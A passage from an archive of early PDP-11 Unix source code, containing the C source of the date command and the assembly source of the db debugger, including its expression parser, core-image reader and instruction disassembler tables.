		if(icnt <= 0)
			return(-1);
		ibufp = ibuf;
	}
	icnt --;
	return(*ibufp++ & 0377);
}

putchar(c)
{

	obuf[ocnt++] = c;
	if(ocnt >= 512)
		flush();
}

flush()
{

	if(ocnt > 0)
		write(1, obuf, ocnt);
	ocnt = 0;
}
-- /usr/source/s1/date.c mode=0100664 uid=3 gid=3 atime=174922719 mtime=169260570 --
int	timbuf[2];
char	*cbp;

char *tzname[2];
int	dmsize[];
char	cbuf[];
char	*cbp;

struct {
	char	name[8];
	char	tty;
	char	fill1;
	int	wtime[2];
	int	fill2;
} wtmp[2];

main(argc, argv)
int argc, **argv;
{
	register char *tzn;
	extern int timezone, *localtime();
	int wf, tfailed;

	tfailed = 0;
	if(argc > 1) {
		cbp = argv[1];
		if(gtime()) {
			write(1, "bad conversion\n", 15);
			exit();
		}
		if (*cbp != 's') {
	/* convert to Greenwich time, on assumption of Standard time. */
			dpadd(timbuf, timezone);
	/* Now fix up to local daylight time. */
			if (localtime(timbuf)[8])
				dpadd(timbuf, -1*60*60);
		}
		time(wtmp[0].wtime);
		wtmp[0].tty =  '|';
		if(stime(timbuf) < 0) {
			tfailed++;
			write(1, "no permission\n", 14);
		} else if ((wf = open("/usr/adm/wtmp", 1)) >= 0) {
			time(wtmp[1].wtime);
			wtmp[1].tty = '}';
			seek(wf, 0, 2);
			write(wf, wtmp, 32);
		}
	}
	if (tfailed==0)
		time(timbuf);
	cbp = cbuf;
	ctime(timbuf);
	write(1, cbuf, 20);
	tzn = tzname[localtime(timbuf)[8]];
	if (tzn)
		write(1, tzn, 3);
	write(1, cbuf+19, 6);
}

gtime()
{
	register int i;
	register int y, t;
	int d, h, m;
	extern int *localtime();
	int nt[2];

	t = gpair();
	if(t<1 || t>12)
		goto bad;
	d = gpair();
	if(d<1 || d>31)
		goto bad;
	h = gpair();
	if(h == 24) {
		h = 0;
		d++;
	}
	m = gpair();
	if(m<0 || m>59)
		goto bad;
	y = gpair();
	if (y<0) {
		time(nt);
		y = localtime(nt)[5];
	}
	if (*cbp == 'p')
		h =+ 12;
	if (h<0 || h>23)
		goto bad;
	timbuf[0] = 0;
	timbuf[1] = 0;
	y =+ 1900;
	for(i=1970; i<y; i++)
		gdadd(dysize(i));
	/* Leap year */
	if (dysize(y)==366 && t >= 3)
		gdadd(1);
	while(--t)
		gdadd(dmsize[t-1]);
	gdadd(d-1);
	gmdadd(24, h);
	gmdadd(60, m);
	gmdadd(60, 0);
	return(0);

bad:
	return(1);
}

gdadd(n)
{
	register char *t;

	t = timbuf[1]+n;
	if(t < timbuf[1])
		timbuf[0]++;
	timbuf[1] = t;
}

gmdadd(m, n)
{
	register int t1;

	timbuf[0] =* m;
	t1 = timbuf[1];
	while(--m)
		gdadd(t1);
	gdadd(n);
}

gpair()
{
	register int c, d;
	register char *cp;

	cp = cbp;
	if(*cp == 0)
		return(-1);
	c = (*cp++ - '0') * 10;
	if (c<0 || c>100)
		return(-1);
	if(*cp == 0)
		return(-1);
	if ((d = *cp++ - '0') < 0 || d > 9)
		return(-1);
	cbp = cp;
	return (c+d);
}
-- /usr/source/s1/db1.s mode=0110664 uid=3 gid=3 atime=174922732 mtime=169260570 --
/ db1 -- debugger

fpp = 0
eae = 0
ldfps = 170100^tst


db:
	mov	sp,r5
	mov	(r5)+,r4
	tst	(r5)+
	cmp	r4,$2
	blt	1f
	mov	(r5),dbfile
	mov	(r5),odbfil
	mov	(r5)+,namfil
	cmp	r4,$2
	beq	1f
	mov	(r5)+,namfil
1:
	sys	open; dbfile: core; 0
	bec	9f
	jmp	fnfnd
9:
	mov	r0,dbfin
	clr	dbfout
	sys	open; odbfil:core; 1
	bes	1f
	mov	r0,dbfout
1:
	sys	open; namfil: a.out; 0
	bes	1f
	mov	r0,r1
	mov	r0,symfin
	sys	read; nambuf; 20
	cmp	nambuf,nobjmagic
	beq	2f
	cmp	nambuf,objmagic
	bne	1f
2:
	mov	nambuf+2,r0	/ text
	add	nambuf+4,r0	/ data
	cmp	nambuf+16,$1	/ relocation?
	beq	6f
	asl	r0		/ sym origin
6:
	add	$20,r0
	mov	r0,0f
	mov	r1,r0
	sys	seek; 0:..; 0
	mov	nambuf+10,r0	/ symbol size
	cmp	r0,$maxsym
	blos	3f
	mov	$maxsym,r0
3:
	add	r0,0f
	sys	break; 0: nambuf
	mov	r0,0f
	mov	r1,r0
	sys	read; nambuf; 0:..
	add	$nambuf,r0
	mov	r0,namsiz
1:
	jsr	r5,get; zero	/ test new object
	cmp	r0,nobjmagic
	beq	2f
	cmp	r0,objmagic
	bne	1f
2:
	mov	$20,getoff
1:
	mov	sp,savsp
	sys	signal; 2; 1
	ror	r0
	bcs	1f
	sys	signal; 2; errexit
1:
	cmp	r4,$2		/ arg count
	beq	9f		/ not core image
	cmp	r4,$4		/ no-core image flag
	beq	9f
	mov	$1024.,getoff
	mov	dbfin,r0
	sys	seek; 0; 0
	mov	dbfin,r0
	sys	read; regbuf; 1024.
	mov	txtsiz,r0
	ash	$6,r0
	mov	r0,txtsiz
	add	$17777,r0
	bic	$17777,r0
	mov	r0,rtxtsiz
	mov	datsiz,r0
	ash	$6,r0
	mov	r0,datsiz
	mov	stksiz,r0
	ash	$6,r0
	mov	r0,stksiz
	mov	*locfpsr,r0
	bic	$!200,r0
	mov	r0,fpsr
	br	loop
9:
loop:
	clr	error
	jsr	pc,readlin
	jsr	pc,readexp
	tst	error
	bne	errexit
	mov	$1,count
	cmpb	r0,$',
	bne	2f
	movb	(r4)+,r0
	mov	addres,-(sp)
	mov	adrflg,-(sp)
	jsr	pc,readexp
	mov	addres,count
	mov	(sp)+,adrflg
	mov	(sp)+,addres
	tst	error
	bne	errexit
2:
	movb	(r4),r0
	jsr	pc,command
	tst	error
	beq	loop
errexit:
	sys	signal; 2; errexit
	mov	savsp,sp
	jsr	r5,mesg; <?\n\0>; .even
	br	loop

fnfnd:
	jsr	r5,mesg; <File not found.\n\0>; .even
ex:
	sys	exit

readlin:
	mov	$inbuf,r4
1:
	mov	ttyfin,r0
	sys	read; ch; 1
	tst	r0
	beq	ex
	cmpb	ch,$'\n
	beq	1f
	movb	ch,(r4)+
	br	1b
1:
	clrb	(r4)
	mov	$inbuf,r4
	rts	pc

switch:
	mov	(r5)+,r1
2:
	cmp	r0,(r1)+
	bne	1f
	tst	(sp)+
	jmp	*(r1)
1:
	tst	(r1)+
	bne	2b
	rts	r5

readexp:
	mov	$'+,lastop
	clr	addres
	clr	starmod
	clr	taddr
	clr	adrflg
nextxp:
	movb	(r4)+,r0
	cmp	r0,$'0
	blt	1f
	cmp	r0,$'9
	ble	numin
	cmp	r0,$'a
	blt	1f
	cmp	r0,$'z
	bgt	1f
	jmp	letin
1:
	cmp	r0,$'a-40
	blt	1f
	cmp	r0,$'z-40
	ble	letin
1:
	jsr	r5,switch; expsw
	tstb	-(r4)
	tst	starmod
	beq	1f
	mov	dot,taddr
	br	operand
1:
	rts	pc

expsw:
	'+;	opex
	'-;	opex
	' ;	nextxp
	'.;	letin
	'_;	letin
	'^;	circumf
	'*;	star
	-1;	0

star:
	mov	pc,starmod
	br	nextxp

operand:
	inc	adrflg
	tst	starmod
	beq	1f
	clr	starmod
	bis	bytemod,error
	jsr	r5,get; taddr
	tst	error
	bne	1f
	mov	r0,taddr
1:
	cmp	lastop,$'+
	beq	1f
	sub	taddr,addres
	br	2f
1:
	add	taddr,addres
2:
	mov	$'+,lastop
	br	nextxp

circumf:
	mov	dot,taddr
	dec	taddr
	tst	bytemod
	bne	operand
	dec	taddr
	br	operand

numin:
	clr	r1
	clr	r3
1:
	sub	$'0,r0
	asl	r1
	asl	r1
	asl	r1
	mpy	$10.,r3
	bis	r0,r1
	add	r0,r3
	movb	(r4)+,r0
	cmp	r0,$'0
	blo	1f
	cmp	r0,$'9
	blos	1b
1:
	cmp	r0,$'.
	bne	1f
	mov	r3,r1
	inc	r4
1:
	mov	r1,taddr
	dec	r4
	br	operand

letin:
	dec	r4
	mov	$nambuf,namstrt
letin1:
	mov	$symbol,r1
	clr	(r1)+
	clr	(r1)+
	clr	(r1)+
	clr	(r1)
	mov	$symbol,r1
	mov	$8.,-(sp)
	br	2f
1:
	tstb	(r4)+
	cmpb	(r4),$'.
	beq	2f
	cmpb	(r4),$'0
	blo	3f
	cmpb	(r4),$'9
	blos	2f
	cmpb	(r4),$'A
	blo	3f
	cmpb	(r4),$'Z
	blos	2f
	cmpb	(r4),$'_
	beq	2f
	cmpb	(r4),$'a
	blo	3f
	cmpb	(r4),$'z
	bhi	3f
2:
	dec	(sp)
	blt	1b
	movb	(r4),(r1)+
	br	1b
3:
	tst	(sp)+
	jsr	pc,lookupn
	tst	error
	bne	1f
	cmpb	(r4),$';
	beq	2f
1:
	jmp	operand
2:
	tstb	(r4)+
	mov	r1,namstrt
	br	letin1

opex:
	mov	r0,lastop
	jmp	nextxp


command:
	jsr	r5,switch; comsw
	inc	error
	rts	pc

comsw:
	'/;	slash
	'\\;	bslash
	'?;	quest
	'\0;	newln
	'^;	circumf
	'=;	equal
	':;	colon
	'!;	excla
	'';	squote
	'";	dquote
	'$;	dolr
	'&;	amper
	'%;	ex
	'`;	grave
	-1;	0

dolr:
	mov	sigp,r1
	bic	$!17,r1
	asl	r1
	mov	traptab(r1),r1
	jsr	pc,string
	jsr	pc,pnl
	mov	$doltab,r5
1:
	mov	(r5)+,r1
	beq	1f
	jsr	pc,*(r5)+
	br	1b
	.if	fpp
1:
	mov	(r5)+,r1
	beq	1f
	ldfps	fpsr
	jsr	pc,*(r5)+
	br	1b
1:
	mov	(r5)+,r1
	jsr	pc,*(r5)+
	.endif
1:
	rts	pc

traptab:
	1f; .data; 1:<?0\0>; .text
	1f; .data; 1:<Hangup\0>; .text
	1f; .data; 1:<Interrupt\0>; .text
	1f; .data; 1:<Quit\0>; .text
	1f; .data; 1:<Illegal instruction\0>; .text
	1f; .data; 1:<Trace/BPT\0>; .text
	1f; .data; 1:<IOT\0>; .text
	1f; .data; 1:<EMT\0>; .text
	1f; .data; 1:<FP exception\0>; .text
	1f; .data; 1:<Killed\0>; .text
	1f; .data; 1:<Bus error\0>; .text
	1f; .data; 1:<Segmentation violation\0>; .text
	1f; .data; 1:<Bad system call\0>; .text
	1f; .data; 1:<?15\0>; .text
	1f; .data; 1:<?16\0>; .text
	1f; .data; 1:<?17\0>; .text

locps:	regbuf+1776
locpc:	regbuf+1774
locr0:	regbuf+1772
locr1:	regbuf+1766
locr2:	regbuf+1750
locr3:	regbuf+1752
locr4:	regbuf+1754
locsp:	regbuf+1764
locr5:	regbuf+1756
locfpsr: regbuf+4
locfr0:	regbuf+6
locfr4:	regbuf+16
locfr5:	regbuf+26
locfr1:	regbuf+36
locfr2:	regbuf+46
locfr3:	regbuf+56

doltab:
	1f; prgreg; locsp; .data; 1:<sp	\0>; .text
	1f; proct; locps; .data; 1:<ps	\0>; .text
	1f; prgreg; locpc; .data; 1:<pc	\0>; .text
	1f; prgreg; locr0; .data; 1:<r0	\0>; .text
	1f; prgreg; locr1; .data; 1:<r1	\0>; .text
	1f; prgreg; locr2; .data; 1:<r2	\0>; .text
	1f; prgreg; locr3; .data; 1:<r3	\0>; .text
	1f; prgreg; locr4; .data; 1:<r4	\0>; .text
	1f; prgreg; locr5; .data; 1:<r5	\0>; .text
	0
	.if	fpp
	1f; prfreg; locfr0; .data; 1:<fr0	\0>; .text
	1f; prfreg; locfr1; .data; 1:<fr1	\0>; .text
	1f; prfreg; locfr2; .data; 1:<fr2	\0>; .text
	1f; prfreg; locfr3; .data; 1:<fr3	\0>; .text
	1f; prfreg; locfr4; .data; 1:<fr4	\0>; .text
	1f; prfreg; locfr5; .data; 1:<fr5	\0>; .text
	0
	1f; proct; locfpsr; .data; 1:<fpsr	\0>; .text
	.endif
.data
.even
.text

	.if	fpp
prfreg:
	mov	*(r5)+,r4
	movf	(r4),fr0
	cfcc
	beq	1f
	jsr	pc,string
	jsr	pc,printf
	jsr	pc,pnl
1:
	rts	pc
	.endif

prgreg:
	jsr	pc,string
	mov	*(r5)+,r4
	mov	(r4),r0
	jsr	pc,printo
	mov	(r4),r0
	jsr	pc,lookupv
	tst	r2
	beq	1f
	jsr	r5,mesg; <	\0>; .even
	mov	(r4),r0
	jsr	pc,pname
1:
	jsr	pc,pnl
	rts	pc

proct:
	jsr	pc,string
	mov	*(r5)+,r4
	mov	(r4),r0
	jsr	pc,printo
	jsr	pc,pnl
	rts	pc

string:
	movb	(r1)+,r0
	beq	1f
	jsr	pc,putc
	br	string
1:
	rts	pc

putc:
	mov	r0,och
	mov	$1,r0
	sys	write; och; 1
	rts	pc

equal:
	jsr	r5,coleq; printo
	rts	pc
amper:
	clr	bytemod
	mov	$2,incdot
	jsr	r5,cycle; asymp
	rts	pc

asymp:
	jsr	pc,pname
	jsr	pc,pnl
	rts	pc

bslash:
	inc	bytemod
	mov	$1,incdot
	br	1f

slash:
	clr	bytemod
	mov	$2,incdot
1:
	jsr	r5,cycle; octp
	rts	pc

grave:
	clr	bytemod
	mov	$2,incdot
	jsr	r5,cycle;  decp
	rts	pc

quest:
	clr	bytemod
	jsr	r5,cycle; psym
	rts	pc

decp:
	jsr	pc,printd
	jsr	r5,mesg; <.\n\0>; .even
	rts	pc

octp:
	jsr	pc,printo
	jsr	pc,pnl
	rts	pc

newln:
	tst	adrflg
	bne	1f
	add	incdot,dot
1:
	mov	nlcom,r0
	jmp	command

excla:
	tst	adrflg
	bne	1f
2:
	inc	error
	rts	pc
1:
	bit	$1,dot
	beq	1f
	tst	bytemod
	beq	2b
1:
	jsr	r5,put; dot; addres
	rts	pc

squote:
	inc	bytemod
	mov	$1,incdot
	br	2f
dquote:
	clr	bytemod
	mov	$2,incdot
2:
	jsr	r5,cycle; ascp
	rts	pc

ascp:
	mov	r0,-(sp)
	jsr	pc,ascp1
	mov	(sp)+,r0
	tst	bytemod
	bne	1f
	swab	r0
	jsr	pc,ascp1
1:
	cmp	count,$1
	bgt	1f
	jsr	pc,pnl
1:
	rts	pc

ascp1:
	bic	$!377,r0
	cmp	r0,$'\n
	beq	2f
	cmp	r0,$011
	beq	2f
	cmp	r0,$40
	blo	1f
	cmp	r0,$177
	bhis	1f
2:
	jsr	pc,putc
	rts	pc
1:
	mov	r0,r1
	jsr	r5,mesg; <\\\0>
	clr	r0
	alsc	$10.,r0
	add	$'0,r0
	jsr	pc,putc
	clr	r0
	alsc	$3,r0
	add	$'0,r0
	jsr	pc,putc
	clr	r0
	alsc	$3,r0
	add	$'0,r0
	jsr	pc,putc
	rts	pc

colon:
	jsr	r5,coleq; pname
	rts	pc

coleq:
	jsr	pc,setadr
	mov	addres,r0
	jsr	pc,*(r5)+
	jsr	pc,pnl
	rts	r5

cycle:
	mov	r0,nlcom
	jsr	pc,setadr
	mov	addres,dot
	tst	bytemod
	bne	1f
	bic	$1,dot
1:
	jsr	r5,get; dot
	tst	error
	bne	1f
	tst	bytemod
	beq	2f
	bic	$!377,r0
2:
	jsr	pc,*(r5)
	tst	error
	bne	1f
	dec	count
	ble	1f
	add	incdot,dot
	br	1b
1:
	tst	(r5)+
	rts	r5

setadr:
	tst	adrflg
	bne	1f
	mov	dot,addres
1:
	rts	pc

	.if	fpp
printf:
	ldfps	$200		/ round+double
	mov	r4,-(sp)
	mov	r3,-(sp)
	movif	$10.,r3
	movif	$1,r2
	clr	r4
	tstf	r0
	cfcc
	beq	2f
	bge	1f
	negf	r0
	mov	$'-,r0
	jsr	pc,putc
1:
	cmpf	r3,r0
	cfcc
	bgt	1f
	inc	r4
	divf	r3,r0
	br	1b
1:
	cmpf	r2,r0
	cfcc
	ble	2f
	dec	r4
	mulf	r3,r0
	br	1b
2:
	modf	r2,r0
	movfi	r1,r0
	add	$'0,r0
	jsr	pc,putc
	mov	$'.,r0
	jsr	pc,putc
	mov	$8.,r3
1:
	modf	r3,r0
	movfi	r1,r0
	add	$'0,r0
	jsr	pc,putc
	dec	r3
	bgt	1b
	mov	$'E,r0
	jsr	pc,putc
	mov	r4,r0
	mov	(sp)+,r3
	mov	(sp)+,r4
	br	printd
	.endif

printd:
	mov	r1,-(sp)
	mov	r0,r1
	bpl	1f
	neg	r1
	mov	$'-,r0
	jsr	pc,putc
1:
	jsr	pc,1f
	mov	(sp)+,r1
	rts	pc
1:
	clr	r0
	dvd	$10.,r0
	mov	r1,-(sp)
	mov	r0,r1
	beq	1f
	jsr	pc,1b
1:
	mov	(sp)+,r0
	add	$'0,r0
	jsr	pc,putc
	rts	pc

-- /usr/source/s1/db2.s mode=0100664 uid=3 gid=3 atime=174922732 mtime=169260570 --
/ db2 -- debugger

lookupn:
	cmp	symbol,$'.
	bne	1f
	mov	dot,taddr
	rts	pc
1:
	tst	error
	beq	1f
	rts	pc
1:
	mov	r2,-(sp)
	mov	namstrt,r1
	mov	namsiz,r2
	jsr	pc,1f
	mov	(sp)+,r2
	rts	pc
1:
	mov	$symbol,r0
	cmp	(r0)+,(r1)+
	bne	2f
	cmp	(r0)+,(r1)+
	bne	3f
	cmp	(r0)+,(r1)+
	bne	4f
	cmp	(r0)+,(r1)+
	bne	5f
	tst	(r1)+
	mov	(r1)+,taddr
	rts	pc
2:
	tst	(r1)+
3:
	tst	(r1)+
4:
	tst	(r1)+
5:
	cmp	(r1)+,(r1)+
	cmp	r1,r2
	blo	1b
	inc	error
	clr	taddr
	rts	pc

lookupv:
	mov	r5,-(sp)
	mov	$nambuf,r5
	clr	r2
	mov	$177777,r3
1:
	cmp	r5,namsiz
	bhis	4f
	mov	12(r5),r1
	sub	r0,r1
	neg	r1
	blt	3f
	cmp	r1,r3
	bhi	3f
	cmp	r1,$4000
	bhis	3f
	cmp	r2,r5
	bhi	3f
	mov	r1,r3
	mov	r5,r2
3:
	add	$14,r5
	br	1b
4:
	mov	(sp)+,r5
	rts	pc

get:
	mov	*(r5)+,r0
	jsr	r5,remap
	tst	error
	bne	2f
	mov	r0,0f
	mov	curfin,r0
	sys	seek; 0:0; 0
	bec	1f
2:
	inc	error
	rts	r5
1:
	mov	curfin,r0
	sys	read; temp; 2
	bes	2b
	tst	r0
	beq	2b
	mov	temp,r0
	rts	r5

remap:
	mov	dbfin,curfin
	cmp	getoff,$1024.
	bne	1f
	cmp	r0,txtsiz
	bhis	2f
	add	$20,r0
	mov	symfin,curfin
	rts	r5
2:
	cmp	r0,rtxtsiz
	blo	3f
	sub	rtxtsiz,r0
	cmp	r0,datsiz
	bhis	2f
	add	$1024.,r0
	rts	r5
2:
	add	rtxtsiz,r0
	neg	r0
	cmp	r0,stksiz
	bhi	3f
	neg	r0
	add	datsiz,r0
	add	stksiz,r0
	add	$1024.,r0
	rts	r5
1:
	add	getoff,r0
	rts	r5
3:
	inc	error
	rts	r5

printo:
	mov	$obuf+6,r1
	clr	r2
1:
	inc	r2
	movb	r0,-(r1)
	bicb	$!7,(r1)
	bisb	$'0,(r1)
	clc
	ror	r0
	asr	r0
	asr	r0
	bne	1b
	mov	r2,0f+2
	mov	r1,0f
	mov	$1,r0
	sys	write; 0:obuf; 6
	rts	pc

mesg:
	movb	(r5)+,r0
	beq	1f
	jsr	pc,putc
	br	mesg
1:
	inc	r5
	bic	$1,r5
	rts	r5

pnl:
	jsr	r5,mesg; <\n\0>
	rts	pc

psp:
	jsr	r5,mesg; < \0>
	rts	pc

pstar:
	jsr	r5,mesg; <*\0>
	rts	pc

plp:
	jsr	r5,mesg; <(\0>
	rts	pc

prp:
	jsr	r5,mesg; <)\0>
	rts	pc

pb:
	jsr	r5,mesg; <b\0>
	rts	pc

pcom:
	jsr	r5,mesg; <,\0>
	rts	pc

put:
	mov	*(r5)+,r0
	jsr	r5,remap
	tst	error
	bne	2f
	cmp	curfin,dbfin
	bne	2f
	mov	r0,0f
	mov	dbfout,r0
	bne	1f
2:
	tst	(r5)+
3:
	inc	error
	rts	r5
1:
	tst	error
	bne	3b
	sys	seek; 0:0; 0
	bes	2b
	mov	(r5)+,0f
	mov	dbfout,r0
	tst	bytemod
	beq	1f
	mov	$1,0f+2
	br	2f
1:
	mov	$2,0f+2
2:
	sys	write; 0:0; 2
	bes	3b
	rts	r5

decodadr:
	mov	r0,r3
	mov	r3,-(sp)
	bic	$!10,(sp)
	bic	$!7,r0
	cmp	r0,$7
	beq	pcadr
7:
	mov	r3,r0
	asr	r0
	asr	r0
	asr	r0
	bic	$!6,r0
	jmp	*1f(r0)

1:
	simp
	incr
	decr
	indx

simp:
	tst	(sp)
	beq	1f
	jsr	pc,plp
1:
	jsr	pc,preg
	tst	(sp)+
	beq	9f
	jsr	pc,prp
	br	9f

incr:
	tst	(sp)+
	beq	1f
	jsr	pc,pstar
1:
	jsr	pc,plp
	jsr	pc,preg
	jsr	r5,mesg; <)+\0>; .even
	br	9f

decr:
	tst	(sp)+
	beq	1f
	jsr	pc,pstar
1:
	jsr	r5,mesg; <-(\0>; .even
	jsr	pc,preg
	jsr	pc,prp
	br	9f

indx:
	tst	(sp)+
	beq	1f
	jsr	pc,pstar
1:
	jsr	pc,get1
	jsr	pc,pname
	jsr	pc,plp
	jsr	pc,preg
	jsr	pc,prp
	br	5f

pcadr:
	mov	r3,r0
	bit	$20,r3
	beq	7b
	tst	(sp)+
	beq	1f
	jsr	pc,pstar
1:
	bit	$40,r3
	bne	6f
	jsr	r5,mesg; <$\0>
	jsr	pc,get1
	jsr	pc,pname
	br	5f
6:
	jsr	pc,get1
	add	$2,r0
	add	r1,r0
	mov	$3,r1
	jsr	pc,pname
	br	5f
9:
	tst	(r5)+
	clr	r0
	rts	r5
5:
	mov	$2,r0
	rts	r5

preg:
	mov	r3,r0
	bic	$!7,r0
	asl	r0
	mov	regtab(r0),obuf
	mov	$1,r0
	sys	write; obuf; 2
	rts	pc

regtab:
	"r0
	"r1
	"r2
	"r3
	"r4
	"r5
	"sp
	"pc

pname:
	mov	r5,-(sp)
	mov	r3,-(sp)
	mov	r1,-(sp)
	jsr	pc,lookupv
	tst	r2
	beq	5f
	cmp	(sp),$1
	bne	1f
	tst	r3
	bne	5f
1:
	mov	r2,r1
	mov	$8,-(sp)
	mov	r0,r5
1:
	movb	(r1)+,r0
	beq	1f
	jsr	pc,putc
	dec	(sp)
	bne	1b
1:
	tst	(sp)+
	cmp	12(r2),r5
	beq	1f
	blt	2f
	jsr	r5,mesg; <-\0>
	br	3f
2:
	jsr	r5,mesg; <+\0>
3:
	mov	r3,r0
5:
	jsr	pc,printo
1:
	tst	(sp)+
	mov	(sp)+,r3
	mov	(sp)+,r5
	rts	pc

get1:
	mov	*(r5)+,r1
	add	$2,r1
	mov	r1,temp
	jsr	r5,get; temp
	rts	pc
-- /usr/source/s1/db3.s mode=0110664 uid=3 gid=3 atime=174922733 mtime=169260570 --
/ db3 -- debugger

psym:
	mov	$2,incdot
	jsr	pc,prints
	jsr	pc,pnl
	rts	pc

prints:
	mov	r0,-(sp)
	mov	$optab,r1
1:
	mov	(sp),r0
	bic	(r1)+,r0
	cmp	(r1)+,r0
	bne	2f
	mov	(r1)+,-(sp)
	jsr	pc,string
	jmp	*(sp)+
2:
	add	$8.,r1
	br	1b

optab:
	107777; 010000; double; <mov\0\0\0>
	107777; 020000; double; <cmp\0\0\0>
	107777; 030000; double; <bit\0\0\0>
	107777; 040000; double; <bic\0\0\0>
	107777; 050000; double; <bis\0\0\0>
	007777; 060000; double; <add\0\0\0>
	007777; 160000; double; <su\0\0\0\0>

	100077; 005000; single; <clr\0\0\0>
	100077; 005100; single; <com\0\0\0>
	100077; 005200; single; <inc\0\0\0>
	100077; 005300; single; <dec\0\0\0>
	100077; 005400; single; <neg\0\0\0>
	100077; 005500; single; <adc\0\0\0>
	100077; 005600; single; <sbc\0\0\0>
	100077; 005700; single; <tst\0\0\0>
	100077; 006000; single; <ror\0\0\0>
	100077; 006100; single; <rol\0\0\0>
	100077; 006200; single; <asr\0\0\0>
	100077; 006300; single; <asl\0\0\0>
	000077; 000100; single; <jmp\0\0\0>
	000077; 000300; single; <swab\0\0>
	000077; 170100; singlw; <ldfps\0>
	000077; 170200; singlw; <stfps\0>
	000077; 170300; singlw; <stst\0\0>
	000077; 170400; singlw; <clrf\0\0>
	000077; 170500; singlw; <tstf\0\0>
	000077; 170600; singlw; <absf\0\0>
	000077; 170700; singlw; <negf\0\0>
	000077; 006700; singlw; <sxt\0\0\0>
	000077; 006600; singlw; <mtpi\0\0>
	000077; 106600; singlw; <mtpd\0\0>
	000077; 006500; singlw; <mfpi\0\0>
	000077; 106500; singlw; <mfpd\0\0>
	000777; 070000; muldiv; <mul\0\0\0>
	000777; 071000; muldiv; <div\0\0\0>
	000777; 072000; muldiv; <ash\0\0\0>
	000777; 073000; muldiv; <ashc\0\0>

	000377; 000400; branch; <br\0\0\0\0>
	000377; 001000; branch; <bne\0\0\0>
	000377; 001400; branch; <beq\0\0\0>
	000377; 002000; branch; <bge\0\0\0>
	000377; 002400; branch; <blt\0\0\0>
	000377; 003000; branch; <bgt\0\0\0>
	000377; 003400; branch; <ble\0\0\0>
	000377; 100000; branch; <bpl\0\0\0>
	000377; 100400; branch; <bmi\0\0\0>
	000377; 101000; branch; <bhi\0\0\0>
	000377; 101400; branch; <blos\0\0>
	000377; 102000; branch; <bvc\0\0\0>
	000377; 102400; branch; <bvs\0\0\0>
	000377; 103000; branch; <bhis\0\0>
	000377; 103400; branch; <blo\0\0\0>

	000000; 000000; noaddr; <halt\0\0>
	000000; 000001; noaddr; <wait\0\0>
	000000; 000002; noaddr; <rti\0\0\0>
	000000; 000004; noaddr; <iot\0\0\0>
	000000; 000005; noaddr; <reset\0>

	000377; 171000; fltrev; <mulf\0\0>
	000377; 171400; fltrev; <modf\0\0>
	000377; 172000; fltrev; <addf\0\0>
	000377; 172400; fltrev; <movf\0\0>
	000377; 173000; fltrev; <subf\0\0>
	000377; 173400; fltrev; <cmpf\0\0>
	000377; 174000; fltnor; <movf\0\0>
	000377; 174400; fltrev; <divf\0\0>
	000377; 175000; fltnor; <movei\0>
	000377; 175400; fltnor; <movfi\0>
	000377; 176000; fltnor; <movfo\0>
	000377; 176400; fltrev; <movie\0>
	000377; 177000; fltrev; <movif\0>
	000377; 177400; fltrev; <movof\0>
	000000; 170000; noaddr; <cfcc\0\0>
	000000; 170001; noaddr; <setf\0\0>
	000000; 170002; noaddr; <seti\0\0>
	000000; 170011; noaddr; <setd\0\0>
	000000; 170012; noaddr; <setl\0\0>

	000777; 004000; specl1; <jsr\0\0\0>
	000777; 074000; specl1; <xor\0\0\0>
	000007; 000200; specl2; <rts\0\0\0>
	000017; 000240; specl3; <cflg\0\0>
	000017; 000260; specl3; <sflg\0\0>
	000377; 104000; specl4; <emt\0\0\0>
	000377; 104400; specl5; <sys\0\0\0>
	000077; 006400; specl7; <mark\0\0>
	000777; 077000; specl8; <sob\0\0\0>
	000007; 000230; specl9; <spl\0\0\0>
	177777; 000000; specl6; <oct\0\0\0>

fltrev:
	bic	$!377,(sp)
muldiv:
	jsr	pc,psp
	mov	(sp)+,r0
	asl	r0
	asl	r0
	swab	r0
	aslb	r0
	aslb	r0
	aslb	r0
	aslb	r0
	asr	r0
	asr	r0
	asr	r0
	asr	r0
	bic	$!7707,r0
	mov	r0,-(sp)
	br	fltnor1

fltnor:
	bic	$!377,(sp)
	br	1f

double:
	tst	(sp)
	bge	1f
	jsr	pc,pb
1:
	jsr	pc,psp
	mov	(sp),r0
fltnor1:
	als	$-6,r0
	jsr	r5,decodadr; dot
	add	r0,incdot
	add	dot,r0
	mov	r0,temp
	jsr	pc,pcom
	mov	(sp)+,r0
	jsr	r5,decodadr; temp
	add	r0,incdot
	rts	pc

single:
	tst	(sp)
	bge	singlw
	jsr	pc,pb
singlw:
	jsr	pc,psp
	mov	(sp)+,r0
	jsr	r5,decodadr; dot
	add	r0,incdot
	rts	pc

specl8: / sob
	jsr	pc,psp
	mov	(sp),r3
	als	$-6,r3
	jsr	pc,preg
	jsr	pc,pcom
	mov	(sp)+,r0
	bic	$!77,r0
	neg	r0
	br	1f

branch:
	jsr	pc,psp
	mov	(sp)+,r0
	bic	$!377,r0
	bit	$200,r0
	beq	1f
	bis	$177400,r0
1:
	inc	r0
	asl	r0
	add	dot,r0
	jsr	pc,pname
	rts	pc

noaddr:
	tst	(sp)+
	rts	pc

specl1: / jsr
	jsr	pc,psp
	mov	(sp),r3
	als	$-6,r3
	jsr	pc,preg
	jsr	pc,pcom
	mov	(sp)+,r0
	jsr	r5,decodadr; dot
	add	r0,incdot
	rts	pc

specl2: / rts
	jsr	pc,psp
	mov	(sp)+,r3
	jsr	pc,preg
	rts	pc

specl3: / opr
	jsr	pc,psp
	mov	(sp)+,r2
	mov	$3f,r1
1:
	bit	$17,r2
	beq	1f
	bit	$10,r2
	beq	2f
	movb	(r1),r0
	jsr	pc,putc
2:
	inc	r1
	asl	r2
	br	1b
1:
	rts	pc
3:
	<nzvc>

specl7: / mark
	bic	$!77,(sp)
	br	specl4

specl9: / spl
	bic	$!7,(sp)
	br	specl4

specl4: / emt
	jsr	pc,psp
	mov	(sp)+,r0
	bic	$!377,r0
8:
	jsr	pc,printo
	rts	pc

specl5: / sys
	jsr	pc,psp
	mov	(sp)+,r2
	bic	$!377,r2
	mov	r2,r0
	asl	r2
	asl	r2
	cmp	r2,$esystab-systab
	bhis	8b
	mov	systab(r2),r1
	jsr	pc,string
	mov	systab+2(r2),-(sp)
	mov	dot,temp1
1:
	dec	(sp)
	bge	2f
	tst	(sp)+
	rts	pc
2:
	jsr	r5,mesg; <;\0>
	add	$2,temp1
	add	$2,incdot
	jsr	r5,get; temp1
	jsr	pc,pname
	br	1b

systab:
	1f; 0; .data; 1:<rele\0>; .text
	1f; 0; .data; 1:<exit\0>; .text
